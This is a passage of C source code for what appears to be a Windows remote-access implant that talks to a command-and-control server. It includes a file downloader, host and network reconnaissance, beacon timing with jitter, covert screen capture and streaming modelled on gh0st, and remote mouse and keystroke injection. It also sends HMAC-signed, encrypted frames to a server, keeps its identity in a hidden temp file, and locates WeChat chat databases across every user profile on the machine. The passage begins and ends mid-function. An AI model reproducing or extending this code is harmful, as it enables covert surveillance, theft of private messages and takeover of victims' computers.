                             uc.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
    if (!hr) goto done;
    if (!WinHttpSendRequest(hr, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                             WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) goto done;
    if (!WinHttpReceiveResponse(hr, NULL)) goto done;
    hf = CreateFileA(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                      FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        if (err) strcpy_s(err, errcap, "cannot write destination");
        goto done;
    }
    for (;;) {
        DWORD avail = 0, got = 0;
        BYTE chunk[16384];
        if (!WinHttpQueryDataAvailable(hr, &avail)) goto done;
        if (avail == 0) break;
        while (avail > 0) {
            DWORD want = avail > sizeof(chunk) ? sizeof(chunk) : avail;
            DWORD wr = 0;
            if (total + want > CAP) {
                if (err) strcpy_s(err, errcap, "response exceeds 64MB cap");
                goto done;
            }
            if (!WinHttpReadData(hr, chunk, want, &got) || got == 0) goto done;
            if (!WriteFile(hf, chunk, got, &wr, NULL) || wr != got) {
                if (err) strcpy_s(err, errcap, "write failed");
                goto done;
            }
            total += got;
            avail -= got;
        }
    }
    rc = 0;
done:
    if (rc != 0 && err && err[0] == '\0')
        _snprintf(err, errcap, "download failed (%lu)", GetLastError());
    if (hf != INVALID_HANDLE_VALUE) CloseHandle(hf);
    if (rc != 0 && hf != INVALID_HANDLE_VALUE) DeleteFileA(dest);
    if (hr) WinHttpCloseHandle(hr);
    if (hc) WinHttpCloseHandle(hc);
    if (hs) WinHttpCloseHandle(hs);
    return rc;
}

/* Network section: adapters with MAC + IPv4 (native IP Helper, no shell). */
static int hostinfo_net(char *out, size_t cap) {
    DWORD len = 0;
    IP_ADAPTER_INFO *ad = NULL;
    size_t used = 0;
    int n = 0;
    if (GetAdaptersInfo(NULL, &len) != ERROR_BUFFER_OVERFLOW) return -1;
    ad = (IP_ADAPTER_INFO *)malloc(len);
    if (!ad) return -1;
    if (GetAdaptersInfo(ad, &len) != NO_ERROR) { free(ad); return -1; }
    used = (size_t)_snprintf(out, cap, "\"network\":{\"adapters\":[");
    {
        IP_ADAPTER_INFO *a = ad;
        while (a && used + 256 < cap) {
            char mac[32] = {0};
            unsigned i;
            for (i = 0; i < a->AddressLength && i < 8; i++)
                _snprintf(mac + i*3, sizeof(mac) - i*3, "%02X%s",
                           a->Address[i], (i+1 < a->AddressLength) ? "-" : "");
            {
                char *desc = jescape(a->Description, strlen(a->Description));
                used += (size_t)_snprintf(out + used, cap - used,
                    "%s{\"name\":\"%s\",\"mac\":\"%s\",\"ip\":\"%s\",\"gateway\":\"%s\"}",
                    n ? "," : "", desc ? desc : "", mac,
                    a->IpAddressList.IpAddress.String[0] ? a->IpAddressList.IpAddress.String : "",
                    a->GatewayList.IpAddress.String[0] ? a->GatewayList.IpAddress.String : "");
                free(desc);
                n++;
            }
            a = a->Next;
        }
    }
    free(ad);
    if (used + 4 >= cap) return -1;
    used += (size_t)_snprintf(out + used, cap - used, "]}");
    return 0;
}

static char *do_hostinfo(const char *category) {
    char host[512] = {0}, user[512] = {0};
    char *out = (char *)malloc(16384);
    OSVERSIONINFOEXA vi;
    MEMORYSTATUSEX ms;
    char cat[32] = {0};
    size_t used = 0;
    int want_sys = 0, want_net = 0, want_rt = 0;
    if (!out) return NULL;
    {
        const char *c = (category && category[0]) ? category : "all";
        size_t i;
        for (i = 0; i < sizeof(cat)-1 && c[i]; i++)
            cat[i] = (c[i] >= 'A' && c[i] <= 'Z') ? (char)(c[i] + 32) : c[i];
    }
    if (strcmp(cat, "all") == 0) want_sys = want_net = want_rt = 1;
    else if (strcmp(cat, "system") == 0) want_sys = 1;
    else if (strcmp(cat, "network") == 0) want_net = 1;
    else if (strcmp(cat, "runtime") == 0) want_rt = 1;
    else {
        _snprintf(out, 16384, "{\"error\":\"unknown category \"\"%s\"\" (want: all|system|network|runtime)\"}", cat);
        return out;
    }
    get_hostname_utf8(host, sizeof(host));
    get_username_utf8(user, sizeof(user));
    memset(&vi, 0, sizeof(vi));
    vi.dwOSVersionInfoSize = sizeof(vi);
    GetVersionExA((OSVERSIONINFOA *)&vi);
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    used = (size_t)_snprintf(out, 16384,
        "{\"category\":\"%s\",\"platform\":\"windows\",\"sections\":{", cat);
    if (want_sys) {
        char *hesc = jescape(host, sizeof(host));
        char *uesc = jescape(user, sizeof(user));
        used += (size_t)_snprintf(out + used, 16384 - used,
            "\"system\":{\"hostname\":\"%s\",\"username\":\"%s\","
            "\"os\":\"Windows %lu.%lu build %lu\",\"arch\":\"amd64\",\"pid\":%lu,"
            "\"mem_total_mb\":%llu,\"mem_free_mb\":%llu}",
            hesc ? hesc : host, uesc ? uesc : user,
            (unsigned long)vi.dwMajorVersion, (unsigned long)vi.dwMinorVersion,
            (unsigned long)vi.dwBuildNumber, (unsigned long)GetCurrentProcessId(),
            ms.ullTotalPhys / (1024*1024), ms.ullAvailPhys / (1024*1024));
        free(hesc); free(uesc);
    }
    if (want_net) {
        char nb[8192];
        if (want_sys) { out[used++] = ','; out[used] = '\0'; }
        if (hostinfo_net(nb, sizeof(nb)) == 0) {
            size_t nl = strlen(nb);
            if (used + nl + 1 < 16384) { memcpy(out + used, nb, nl); used += nl; out[used] = '\0'; }
        } else if (used + 32 < 16384) {
            used += (size_t)_snprintf(out + used, 16384 - used,
                "\"network\":{\"error\":\"adapter query failed\"}");
        }
    }
    if (want_rt) {
        unsigned long long ms_up = GetTickCount64();
        unsigned dd = (unsigned)(ms_up / 86400000ULL);
        unsigned hh = (unsigned)((ms_up / 3600000ULL) % 24);
        unsigned mm = (unsigned)((ms_up / 60000ULL) % 60);
        if (want_sys || want_net) { out[used++] = ','; out[used] = '\0'; }
        if (used + 128 < 16384)
            used += (size_t)_snprintf(out + used, 16384 - used,
                "\"runtime\":{\"uptime\":\"%ud %uh %um\",\"pid\":%lu}",
                dd, hh, mm, (unsigned long)GetCurrentProcessId());
    }
    if (used + 4 >= 16384) { free(out); return NULL; }
    out[used++] = '}'; out[used++] = '}'; out[used] = '\0';
    return out;
}

static void do_sleep_interval(void) {
    int base_ms = g_interval * 1000;
    int jitter_ms = 0;
    if (g_jitter > 0 && g_jitter <= 100) {
        BYTE r[4];
        unsigned v = 0;
        if (cng_random(r, 4) == 0) {
            v = ((unsigned)r[0] << 24) | ((unsigned)r[1] << 16) |
                ((unsigned)r[2] << 8) | r[3];
            jitter_ms = (int)((long long)base_ms * (v % (unsigned)(g_jitter + 1)) / 100);
            if ((v >> 16) & 1) base_ms += jitter_ms;
            else { base_ms -= jitter_ms; if (base_ms < 1000) base_ms = 1000; }
        }
    }
    if (base_ms < 1000) base_ms = 1000;
    Sleep((DWORD)base_ms);
}

/* ---------- screen capture (gh0st C_SCREEN parity, stills + polled stream) ---
 * Fullscreen or single-window JPEG via GDI+ flat API (pure C; the SDK
 * gdiplus.h is C++-only, so the handful of entry points used here are
 * declared manually above). Streaming is deliberately beacon-paced: one
 * frame per beacon iteration while g_streaming is set, with FNV-1a
 * dedup of identical frames (Go screenFrameHash parity, fixed-size hash). */

static int jpeg_encoder_clsid(CLSID *out) {
    UINT n = 0, size = 0, i;
    GDIP_ImageCodecInfo *enc = NULL;
    int found = -1;
    if (!out) return -1;
    if (GdipGetImageEncodersSize(&n, &size) != GDIP_Ok || n == 0) return -1;
    enc = (GDIP_ImageCodecInfo *)malloc(size);
    if (!enc) return -1;
    if (GdipGetImageEncoders(n, size, enc) != GDIP_Ok) { free(enc); return -1; }
    for (i = 0; i < n; i++) {
        if (enc[i].MimeType && wcscmp(enc[i].MimeType, L"image/jpeg") == 0) {
            *out = enc[i].Clsid;
            found = 0;
            break;
        }
    }
    free(enc);
    return found;
}

/* Capture fullscreen (hwnd==NULL) or one window as JPEG.
 * Returns 0 with malloc'd *out_jpg on success; caller frees with free(). */
static int capture_jpeg(int quality, HWND hwnd, BYTE **out_jpg, DWORD *out_len) {
    HDC hdc = NULL, memdc = NULL;
    HBITMAP hbmp = NULL, oldbmp = NULL;
    int w = 0, h = 0;
    ULONG_PTR token = 0;
    int token_started = 0;
    /* GdiplusStartupInput layout: Version(UINT32), DebugCallback(ptr),
     * SuppressBackgroundThread(BOOL), SuppressExternalCodecs(BOOL). */
    struct { UINT32 ver; void *dbg; BOOL noBg; BOOL noExt; } si = {1, NULL, FALSE, FALSE};
    GpBitmapShim *bmp = NULL;
    CLSID clsid;
    GDIP_EncoderParameters *params = NULL;
    ULONG qval;
    IStream *stream = NULL;
    HGLOBAL hmem = NULL;
    BYTE *locked = NULL;
    SIZE_T nbytes = 0;
    BYTE *jpg = NULL;
    int rc = -1;
    if (!out_jpg || !out_len) return -1;
    if (quality < 1) quality = 1;
    if (quality > 100) quality = 100;
    if (hwnd) {
        RECT rcw;
        if (!IsWindow(hwnd)) goto done;
        hdc = GetWindowDC(hwnd);
        if (!hdc) goto done;
        if (!GetWindowRect(hwnd, &rcw)) goto done;
        w = rcw.right - rcw.left;
        h = rcw.bottom - rcw.top;
    } else {
        hdc = GetDC(NULL);
        if (!hdc) goto done;
        w = GetSystemMetrics(SM_CXSCREEN);
        h = GetSystemMetrics(SM_CYSCREEN);
    }
    if (w <= 0 || h <= 0 || (long long)w * h > 64LL * 1024 * 1024) goto done;
    memdc = CreateCompatibleDC(hdc);
    hbmp = CreateCompatibleBitmap(hdc, w, h);
    if (!memdc || !hbmp) goto done;
    oldbmp = SelectObject(memdc, hbmp);
    if (!oldbmp) goto done;
    if (!BitBlt(memdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY | CAPTUREBLT)) goto done;
    if (GdiplusStartup(&token, &si, NULL) != GDIP_Ok) goto done;
    token_started = 1;
    if (GdipCreateBitmapFromHBITMAP(hbmp, NULL, &bmp) != GDIP_Ok) goto done;
    if (jpeg_encoder_clsid(&clsid) != 0) goto done;
    params = (GDIP_EncoderParameters *)malloc(sizeof(GDIP_EncoderParameters));
    if (!params) goto done;
    qval = (ULONG)quality;
    params->Count = 1;
    params->Parameter[0].Guid = GDIP_EncoderQuality;
    params->Parameter[0].NumberOfValues = 1;
    params->Parameter[0].Type = GDIP_EncoderParameterValueTypeLong;
    params->Parameter[0].Value = &qval;
    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK) goto done;
    if (GdipSaveImageToStream((GpImageShim *)bmp, stream, &clsid, params) != GDIP_Ok) goto done;
    if (GetHGlobalFromStream(stream, &hmem) != S_OK) goto done;
    nbytes = GlobalSize(hmem);
    locked = (BYTE *)GlobalLock(hmem);
    if (!locked || nbytes == 0 || nbytes > 8u * 1024u * 1024u) goto done;
    jpg = (BYTE *)malloc(nbytes);
    if (!jpg) goto done;
    memcpy(jpg, locked, nbytes);
    rc = 0;
done:
    if (locked) GlobalUnlock(hmem);
    if (stream) stream->lpVtbl->Release(stream);
    if (bmp) GdipDisposeImage((GpImageShim *)bmp);
    if (token_started) GdiplusShutdown(token);
    free(params);
    if (oldbmp) SelectObject(memdc, oldbmp);
    if (hbmp) DeleteObject(hbmp);
    if (memdc) DeleteDC(memdc);
    if (hdc) {
        if (hwnd) ReleaseDC(hwnd, hdc);
        else ReleaseDC(NULL, hdc);
    }
    if (rc == 0) {
        *out_jpg = jpg;
        *out_len = (DWORD)nbytes;
    } else {
        free(jpg);
    }
    return rc;
}

static unsigned long frame_hash(const BYTE *d, DWORD n) {
    unsigned long h = 2166136261u;
    DWORD i;
    if (!d) return 0;
    for (i = 0; i < n; i++) { h ^= d[i]; h *= 16777619u; }
    return h;
}

/* screenshot task body. window may be a decimal HWND; anything else (or an
 * invalid handle) falls back to fullscreen — Go handleScreenshotWindow
 * ignores its parameter entirely, so this is a strict superset. */
static BYTE *do_screenshot_jpeg(const char *window, int quality, DWORD *outlen) {
    BYTE *jpg = NULL;
    DWORD n = 0;
    HWND hwnd = NULL;
    if (window && *window) {
        char *end = NULL;
        unsigned long long v = _strtoui64(window, &end, 10);
        if (end && *end == '\0' && v != 0 && IsWindow((HWND)(uintptr_t)v))
            hwnd = (HWND)(uintptr_t)v;
    }
    if (capture_jpeg(quality, hwnd, &jpg, &n) != 0) return NULL;
    if (outlen) *outlen = n;
    return jpg;
}

static char *emit_frame_result(const BYTE *jpg, DWORD n) {
    char *b64 = b64enc(jpg, n);
    char *o;
    size_t need;
    if (!b64) return NULL;
    need = strlen(b64) + 128;
    o = (char *)malloc(need);
    if (o) {
        _snprintf(o, need,
            "{\"task_id\":0,\"type\":\"screen_frame\",\"output\":\"%s\","
            "\"encoding\":\"base64\",\"rid\":\"\"}",
            b64);
    }
    free(b64);
    return o;
}

static char *emit_stream_error(const char *msg) {
    char *esc = jescape(msg ? msg : "screen stream stopped", strlen(msg ? msg : "screen stream stopped"));
    char *o;
    size_t need;
    if (!esc) return NULL;
    need = strlen(esc) + 128;
    o = (char *)malloc(need);
    if (o) {
        _snprintf(o, need,
            "{\"task_id\":0,\"type\":\"screen_stream_error\",\"error\":\"%s\",\"rid\":\"\"}",
            esc);
    }
    free(esc);
    return o;
}

/* Append one result object to a comma-joined results list, honoring the
 * shared RESULTS_CAP bound. *list must be non-NULL (may be ""). */
static void results_append(char **list, char *robj) {
    size_t need;
    char *nr;
    if (!list || !*list || !robj) { free(robj); return; }
    need = strlen(*list) + strlen(robj) + 2;
    if (need > RESULTS_CAP) { free(robj); return; }
    nr = (char *)realloc(*list, need);
    if (!nr) { free(robj); return; }
    *list = nr;
    if ((*list)[0]) strcat_s(*list, need, ",");
    strcat_s(*list, need, robj);
    free(robj);
}

/* Parse the stream quality from a Go-style "interval,quality" command.
 * Only quality is honored (frames are beacon-paced); high/medium/low map
 * like Go parseVideoSettings. Defaults to 65. */
static int parse_stream_q(const char *cmd) {
    const char *comma;
    char q[32];
    size_t i, o = 0;
    long v;
    char *end = NULL;
    if (!cmd) return 65;
    comma = strchr(cmd, ',');
    if (!comma) return 65;
    comma++;
    while (*comma == ' ' || *comma == '\t') comma++;
    for (i = 0; comma[i] && o + 1 < sizeof(q); i++) {
        char c = comma[i];
        if (c >= 'A' && c <= 'Z') c = (char)(c + ('a' - 'A'));
        q[o++] = c;
    }
    q[o] = '\0';
    if (strcmp(q, "high") == 0) return 85;
    if (strcmp(q, "medium") == 0) return 65;
    if (strcmp(q, "low") == 0) return 40;
    v = strtol(q, &end, 10);
    if (end && *end == '\0' && v >= 1 && v <= 100) return (int)v;
    return 65;
}

static char *do_remote_input(const char *json, DWORD *outlen, const char **err) {
    char ack[128];
    char *out;
    char type[32] = {0};
    char key[64] = {0};
    unsigned long long x, y;
    if (err) *err = NULL;
    if (!json || !jstring(json, "type", type, sizeof(type))) {
        if (err) *err = "remote_input: type required (move/click/key)";
        return NULL;
    }
    if (strcmp(type, "move") == 0 || strcmp(type, "click") == 0) {
        x = ju64(json, "x");
        y = ju64(json, "y");
        SetCursorPos((int)x, (int)y);
        if (strcmp(type, "click") == 0) {
            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
            _snprintf(ack, sizeof(ack), "remote_input: click at (%llu,%llu) injected", x, y);
        } else {
            _snprintf(ack, sizeof(ack), "remote_input: move to (%llu,%llu)", x, y);
        }
    } else if (strcmp(type, "key") == 0) {
        SHORT vkres;
        BYTE vk;
        int shift;
        if (!jstring(json, "key", key, sizeof(key)) || !key[0] || key[1]) {
            if (err) *err = "remote_input: key requires one character";
            return NULL;
        }
        vkres = VkKeyScanA(key[0]);
        if (vkres == -1) {
            if (err) *err = "remote_input: unmappable key";
            return NULL;
        }
        vk = LOBYTE(vkres);
        shift = HIBYTE(vkres);
        if (shift & 1) keybd_event(VK_SHIFT, 0, 0, 0);
        if (shift & 2) keybd_event(VK_CONTROL, 0, 0, 0);
        if (shift & 4) keybd_event(VK_MENU, 0, 0, 0);
        keybd_event(vk, 0, 0, 0);
        keybd_event(vk, 0, KEYEVENTF_KEYUP, 0);
        if (shift & 4) keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
        if (shift & 2) keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0);
        if (shift & 1) keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0);
        _snprintf(ack, sizeof(ack), "remote_input: key '%s' injected", key);
    } else {
        if (err) *err = "remote_input: unknown type (move/click/key)";
        return NULL;
    }
    out = _strdup(ack);
    if (outlen && out) *outlen = (DWORD)strlen(out);
    return out;
}

/* ---------- frames ---------- */

static char *build_register(void) {
    BYTE idpub[32];
    char *idb64, *hmacb64, *out;
    long long ts = (long long)_time64(NULL);
    unsigned long long seq = next_seq();
    char seqs[32], tss[32];
    /* identity keypair doubles as the session keypair seed: the server
     * derives the registration session from our identity public key. */
    extern BYTE g_idpub_for_reg[32];
    memcpy(idpub, g_idpub_for_reg, 32);
    idb64 = b64enc(idpub, 32);
    if (!idb64) return NULL;
    hmacb64 = make_reg_hmac(idb64, ts, seq);
    if (!hmacb64) { free(idb64); return NULL; }
    _snprintf(seqs, sizeof(seqs), "%llu", seq);
    _snprintf(tss, sizeof(tss), "%lld", ts);
    out = (char *)malloc(2048);
    if (out) {
        _snprintf(out, 2048,
                  "{\"uuid\":\"%s\",\"seq\":%s,\"ts\":%s,"
                  "\"ecdh_pub\":\"%s\",\"id_pub\":\"%s\","
                  "\"secret_id\":\"%s\",\"reg_hmac\":\"%s\"}",
                  g_uuid, seqs, tss, idb64, idb64, SECRET_ID, hmacb64);
    }
    free(idb64);
    free(hmacb64);
    return out;
}

/* 1 = register (fresh identity / server asked), 0 = handshake (recover). */
static int g_mode_register = 1;

/* frame mac = b64(HMAC(regKey, parts...)) */
static char *make_frame_mac(const char *a, const char *b, const char *c, const char *d) {
    BYTE mac[32];
    size_t la = strlen(a), lb = strlen(b), lc = strlen(c), ld = strlen(d);
    char *msg = (char *)malloc(la + lb + lc + ld + 1);
    char *out;
    if (!msg) return NULL;
    memcpy(msg, a, la);
    memcpy(msg + la, b, lb);
    memcpy(msg + la + lb, c, lc);
    memcpy(msg + la + lb + lc, d, ld);
    msg[la + lb + lc + ld] = '\0';
    if (cng_hmac_sha256(g_regkey, 32, (BYTE *)msg, (DWORD)(la + lb + lc + ld), mac) != 0) {
        free(msg);
        return NULL;
    }
    free(msg);
    out = b64enc(mac, 32);
    cng_wipe(mac, 32);
    return out;
}

static char *build_handshake(void) {
    BYTE eph[32];
    char *ephb64, *macb64, *out;
    long long ts = (long long)_time64(NULL);
    unsigned long long seq = next_seq();
    char seqs[32], tss[32];
    if (cng_x25519_ephemeral(eph) != 0) return NULL;
    ephb64 = b64enc(eph, 32);
    if (!ephb64) return NULL;
    _snprintf(seqs, sizeof(seqs), "%llu", seq);
    _snprintf(tss, sizeof(tss), "%lld", ts);
    macb64 = make_frame_mac(g_uuid, ephb64, tss, seqs);
    if (!macb64) { free(ephb64); return NULL; }
    out = (char *)malloc(2048);
    if (out) {
        _snprintf(out, 2048,
                  "{\"uuid\":\"%s\",\"seq\":%s,\"ts\":%s,"
                  "\"ecdh_pub\":\"%s\",\"secret_id\":\"%s\",\"mac\":\"%s\"}",
                  g_uuid, seqs, tss, ephb64, SECRET_ID, macb64);
    }
    free(ephb64);
    free(macb64);
    return out;
}

BYTE g_idpub_for_reg[32];

static char *build_encrypted(const char *inner, unsigned long long *seqout) {
    char aad[128];
    char seqs[32], tss[32];
    unsigned long long seq = next_seq();
    char *c64, *out;
    BYTE *blob;
    DWORD blobcap, bloblen;
    long long ts = (long long)_time64(NULL);
    _snprintf(seqs, sizeof(seqs), "%llu", seq);
    _snprintf(tss, sizeof(tss), "%lld", ts);
    _snprintf(aad, sizeof(aad), "%s%c%s", g_uuid, '\0', seqs);
    blobcap = (DWORD)strlen(inner) + 12 + 16;
    blob = (BYTE *)malloc(blobcap);
    if (!blob) return NULL;
    bloblen = (DWORD)cng_aesgcm_encrypt(g_sesskey, (const BYTE *)inner,
                                        (DWORD)strlen(inner),
                                        (const BYTE *)aad,
                                        (DWORD)(strlen(g_uuid) + 1 + strlen(seqs)),
                                        blob, blobcap);
    if ((int)bloblen < 0) { free(blob); return NULL; }
    c64 = b64enc(blob, bloblen);
    free(blob);
    if (!c64) return NULL;
    out = (char *)malloc(strlen(c64) + 256);
    if (out) {
        _snprintf(out, strlen(c64) + 256,
                  "{\"uuid\":\"%s\",\"seq\":%s,\"ts\":%s,\"c\":\"%s\"}",
                  g_uuid, seqs, tss, c64);
    }
    free(c64);
    *seqout = seq;
    return out;
}

static void gen_uuid(void) {
    BYTE b[16];
    cng_random(b, 16);
    b[6] = (BYTE)((b[6] & 0x0F) | 0x40);
    b[8] = (BYTE)((b[8] & 0x3F) | 0x80);
    _snprintf(g_uuid, sizeof(g_uuid),
              "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
              b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7],
              b[8], b[9], b[10], b[11], b[12], b[13], b[14], b[15]);
}

/* Identity persistence: UUID + X25519 identity private key live in %TEMP%.
 * Without this every restart would burn a fresh v3 secret (each secret binds
 * to exactly one agent id) and orphan the previous agent row. */
static int ident_path(char *out, size_t cap) {
    DWORD n = GetTempPathA((DWORD)cap, out);
    if (n == 0 || n >= cap - 16) return -1;
    strcat_s(out, cap, "fc2c.dat");
    return 0;
}

static int ident_save(const BYTE idpriv[32]) {
    char path[MAX_PATH];
    HANDLE hf;
    DWORD wr;
    BYTE blob[16 + 37 + 32];
    if (ident_path(path, sizeof(path)) != 0) return -1;
    /* layout: uuid ascii (36+NUL=37) + priv(32); %TEMP% is user-private. */
    memcpy(blob, g_uuid, 37);
    memcpy(blob + 37, idpriv, 32);
    memset(blob + 37 + 32, 0, sizeof(blob) - 37 - 32);
    hf = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                     FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hf == INVALID_HANDLE_VALUE) return -1;
    WriteFile(hf, blob, sizeof(blob), &wr, NULL);
    CloseHandle(hf);
    cng_wipe(blob, sizeof(blob));
    return wr == sizeof(blob) ? 0 : -1;
}

static int ident_load(BYTE idpriv[32]) {
    char path[MAX_PATH];
    HANDLE hf;
    DWORD rd = 0;
    BYTE blob[16 + 37 + 32];
    int hexok = 1;
    size_t i;
    if (ident_path(path, sizeof(path)) != 0) return -1;
    hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                     FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return -1;
    ReadFile(hf, blob, sizeof(blob), &rd, NULL);
    CloseHandle(hf);
    if (rd != sizeof(blob) || blob[36] != '\0') return -1;
    /* validate uuid shape loosely (36 chars, dashes at 8/13/18/23) */
    if (strlen((char *)blob) != 36 || blob[8] != '-' || blob[13] != '-' ||
        blob[18] != '-' || blob[23] != '-') return -1;
    for (i = 0; i < 36; i++) {
        char c = (char)blob[i];
        if (i == 8 || i == 13 || i == 18 || i == 23) continue;
        if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') ||
              (c >= 'A' && c <= 'F'))) { hexok = 0; break; }
    }
    if (!hexok) return -1;
    memcpy(g_uuid, blob, 37);
    memcpy(idpriv, blob + 37, 32);
    cng_wipe(blob, sizeof(blob));
    return 0;
}

/* ---------- wechat_history helpers ---------- */

typedef struct { long long id; char name[64]; } wechat_name_t;

static void wechat_ascii_lower(char *dst, size_t cap, const char *src) {
    size_t i;
    if (cap == 0) return;
    for (i = 0; src[i] && i + 1 < cap; i++) {
        char ch = src[i];
        dst[i] = (ch >= 'A' && ch <= 'Z') ? (char)(ch + 32) : ch;
    }
    dst[i] = '\0';
}

/* Table probe: 1 present, 0 absent, -1 query error (e.g. encrypted DB —
   sqlite opens lazily and only fails on first use). */
static int wechat_db_has_table(sqlite3 *db, const char *name, int *qerr) {
    sqlite3_stmt *st = NULL;
    int found = 0;
    if (sqlite3_prepare_v2(db, "SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name=?", -1, &st, NULL) != SQLITE_OK) {
        if (qerr) *qerr = 1;
        return -1;
    }
    sqlite3_bind_text(st, 1, name, -1, SQLITE_TRANSIENT);
    int rc = sqlite3_step(st);
    if (rc == SQLITE_ROW) {
        found = sqlite3_column_int(st, 0) > 0;
    } else if (rc != SQLITE_DONE) {
        if (qerr) *qerr = 1;
        sqlite3_finalize(st);
        return -1;
    }
    sqlite3_finalize(st);
    return found;
}

/* True for DB filenames that carry chat messages (vs accessory DBs like
   Emotion/Media/Favorite). Only gates the open-failure error line. */
static int wechat_is_msg_db_name(const char *fname) {
    char lower[128];
    wechat_ascii_lower(lower, sizeof(lower), fname);
    return strstr(lower, "micromsg") != NULL || strstr(lower, "msg") != NULL || strstr(lower, "message") != NULL;
}

/* Load Name2ID (rowid == MSG.TalkerId) into map; returns entry count.
   The single value column is named differently per WeChat version, so it
   is resolved via PRAGMA-style introspection instead of hard-coded. */
static int wechat_load_name2id(sqlite3 *db, wechat_name_t *map, int cap) {
    int n = 0;
    sqlite3_stmt *cs = NULL;
    if (sqlite3_prepare_v2(db, "SELECT * FROM Name2ID LIMIT 0", -1, &cs, NULL) != SQLITE_OK) return 0;
    int ncol = sqlite3_column_count(cs);
    int picked = -1;
    for (int i = 0; i < ncol; i++) {
        const char *cn = (const char *)sqlite3_column_name(cs, i);
        if (!cn) continue;
        char lb[64];
        wechat_ascii_lower(lb, sizeof(lb), cn);
        if (picked < 0) picked = i;
        if (strstr(lb, "user") || strstr(lb, "name")) { picked = i; break; }
    }
    char col[64] = {0};
    if (picked >= 0) {
        const char *cn = (const char *)sqlite3_column_name(cs, picked);
        if (cn) _snprintf(col, sizeof(col), "%s", cn);
    }
    sqlite3_finalize(cs);
    if (!col[0] || strchr(col, '"')) return 0;
    char q[160] = {0};
    _snprintf(q, sizeof(q), "SELECT rowid, \"%s\" FROM Name2ID", col);
    sqlite3_stmt *ds = NULL;
    if (sqlite3_prepare_v2(db, q, -1, &ds, NULL) != SQLITE_OK) return 0;
    while (n < cap && sqlite3_step(ds) == SQLITE_ROW) {
        const char *nm = (const char *)sqlite3_column_text(ds, 1);
        if (!nm || !nm[0]) continue;
        map[n].id = sqlite3_column_int64(ds, 0);
        _snprintf(map[n].name, sizeof(map[n].name), "%s", nm);
        n++;
    }
    sqlite3_finalize(ds);
    return n;
}

/* Emit one JSON chat line plus bump the counter. Shared shape with the
   legacy branch so the server/UI parser sees identical output. */
static void wechat_emit_json(char *out, long long ctime_sec, int issender, const char *room, const char *talker, int mtype, const char *content, int *total_rows) {
    time_t sec = (time_t)ctime_sec;
    struct tm *tm = gmtime(&sec);
    char timeBuf[64] = {0};
    if (tm) strftime(timeBuf, sizeof(timeBuf), "%Y-%m-%dT%H:%M:%SZ", tm);
    const char *senderText = issender == 1 ? "me" : "other";
    char *timeEsc = jescape(timeBuf, strlen(timeBuf));
    char *senderEsc = jescape(senderText, strlen(senderText));
    char *contactEsc = jescape(room, strlen(room));
    char *talkerEsc = jescape(talker, strlen(talker));
    char *contentEsc = jescape(content, strlen(content));
    if (!timeEsc || !senderEsc || !contactEsc || !talkerEsc || !contentEsc) {
        free(timeEsc);
        free(senderEsc);
        free(contactEsc);
        free(talkerEsc);
        free(contentEsc);
        return;
    }
    size_t need = strlen(timeEsc) + strlen(senderEsc) + strlen(contactEsc) +
        strlen(talkerEsc) + strlen(contentEsc) + 128;
    char *line = (char *)malloc(need);
    if (line) {
        _snprintf(line, need,
            "{\"time\":\"%s\",\"sender\":\"%s\",\"contact\":\"%s\",\"contact_id\":\"%s\",\"type\":%d,\"content\":\"%s\"}\n",
            timeEsc, senderEsc, contactEsc, talkerEsc, mtype, contentEsc);
        strcat_s(out, 65536, line);
        free(line);
        (*total_rows)++;
    }
    free(timeEsc);
    free(senderEsc);
    free(contactEsc);
    free(talkerEsc);
    free(contentEsc);
}

/* ---------- wechat_history implementation ---------- */

static char *do_wechat_history(const char *filter_json, DWORD *outlen) {
    if (!filter_json) filter_json = "{}";

    /* Parse simple JSON filter: {"filter":"all","contact":"","start_time":"","end_time":""} */
    char contact[256] = {0};
    if (!jstring(filter_json, "contact", contact, sizeof(contact))) {
        contact[0] = '\0';
    }
    /* Normalize ASCII case so SQL LOWER(...) matching behaves like the Go agent. */
    for (char *cp = contact; *cp; cp++) {
        if (*cp >= 'A' && *cp <= 'Z') *cp = (char)(*cp + ('a' - 'A'));
    }
    const int hasContact = contact[0] != '\0' && strcmp(contact, "all") != 0;

    /* WeChat account roots, oldest layout first:
       legacy (<=3.x):  %APPDATA%\Tencent\WeChat\<wxid>\Msg
       modern (>=3.9/4.x default): %USERPROFILE%\Documents\WeChat Files\<wxid>\Msg
       plus every local profile's legacy/modern/OneDrive layouts (the agent
       often runs as SYSTEM or another account than the WeChat login). */
    char roots[12][MAX_PATH];
    int nroots = 0;
    char probed[2048] = {0};
#define WECHAT_ADD_ROOT(p_) do { \
        if (nroots < 12 && GetFileAttributesA(p_) != INVALID_FILE_ATTRIBUTES) { \
            int dup = 0; \
            for (int d = 0; d < nroots; d++) { \
                if (_stricmp(roots[d], (p_)) == 0) { dup = 1; break; } \
            } \
            if (!dup) { \
                _snprintf(roots[nroots], MAX_PATH, "%s", (p_)); \
                nroots++; \
            } \
        } \
    } while (0)
#define WECHAT_NOTE_PROBED(p_) do { \
        if (probed[0]) strncat(probed, "; ", sizeof(probed) - strlen(probed) - 1); \
        strncat(probed, (p_), sizeof(probed) - strlen(probed) - 1); \
    } while (0)
    {
